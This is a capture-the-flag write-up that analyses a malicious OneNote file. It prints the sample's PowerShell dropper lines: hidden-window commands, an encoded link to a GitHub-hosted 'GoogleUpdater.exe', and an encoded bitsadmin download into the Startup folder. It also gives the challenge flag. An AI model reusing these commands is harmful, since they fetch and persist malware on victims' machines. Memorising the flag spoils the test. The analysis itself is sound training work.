---
title: "Note [REV]"
description: "Simple RE Challenge with a PowerShell malware theme."
sidebar_position: 3
tags: ["rev"]
---

*August 17, 2023*

Simple RE Challenge with a PowerShell malware theme.

## Challenge Description

> Our company recently received a file claiming to contain flags for Sibersiaga 2023. When opening the file, all it showed was a blurred page with a “click here to view” button. So far, nothing has happened to our employees. Yet. Please investigate this one note at your earliest convenience. Disclaimer: -This contains real malware. Please proceed in a safe environment. -Do not upload files on VT or any malware sandbox to avoid fingerprint and bad labeling.
> 
> Password: `infected`
> 
> Flag format: `sibersiaga{strings}`

50 points, 10 solves

## Solution

After unzipping the challenge file, we can start analyzing the file with `file` and `strings`. We found an encrypted PowerShell payload at the bottom context after using `strings`. Hence we can `grep` the payload out.

```text
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ file One\ Note.one
One Note.one: data
                                                                                                                                                             
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ strings One\ Note.one | grep 'powershell'
start powershell -WindowStyle Hidden -Command calc.exe
for /f %%i in ('powershell -command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL01vcmdhblRhcmF1bS9zaWx2ZXItc3Bvb24vcmF3L21haW4vR29vZ2xlVXBkYXRlci5leGU='))"') do set "humuhumu=%%i"
powershell -WindowStyle hidden -e "JABoAHUAaAB1ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAGEASABSADAAYwBIAE0ANgBMAHkAOQBuAGEAWABSAG8AZABXAEkAdQBZADIAOQB0AEwAMAAxAHYAYwBtAGQAaABiAGwAUgBoAGMAbQBGADEAYgBTADkAegBhAFcAeAAyAFoAWABJAHQAYwAzAEIAdgBiADIANAB2AGMAbQBGADMATAAyADEAaABhAFcANAB2AFIAMgA5AHYAWgAyAHgAbABWAFgAQgBrAFkAWABSAGwATABtAFYANABaAFEAPQA9ACcAKQApAA0ACgAkAGgAdQBtAHUAaAB1AG0AdQBoAHUAPQAkAGUAbgB2ADoAYQBwAHAAZABhAHQAYQAgACsAIAAiAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABHAG8AbwBnAGwAYQBVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAYgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcgAgAG0AeQBEAG8AdwBuAGwAbwBhAGQASgBvAGIAIAAvAGQAbwB3AG4AbABvAGEAZAAgAC8AcAByAGkAbwByAGkAdAB5ACAAbgBvAHIAbQBhAGwAIAAkAGgAdQBoAHUAIAAkAGgAdQBtAHUAaAB1AG0AdQBoAHUA"
```

Surprisingly, there is another payload with a base64 encoded string `aHR0cHM6Ly9naXRodWIuY29tL01vcmdhblRhcmF1bS9zaWx2ZXItc3Bvb24vcmF3L21haW4vR29vZ2xlVXBkYXRlci5leGU` appeared after filtering out the challenge file.

Decode the string via CyberChef and we get a link navigating to a GitHub repository.

![image](/img/ctfs/codecombat2023-note-01.png)

Go to the following link, we can see the repository contains a `GoogleUpdater.exe`.

![image](/img/ctfs/codecombat2023-note-02.png)

Download the file, run `strings`, and try `grep` the flag out as we already know the flag format.

```text
┌──(kali㉿kali)-[~/codecombat2023/note]
└─$ strings GoogleUpdate.exe| grep -i sibersiaga
echo sibersiaga{s4Tu_n0T4_m41w4Re} > nul
```

***FLAG***: `sibersiaga{s4Tu_n0T4_m41w4Re}`
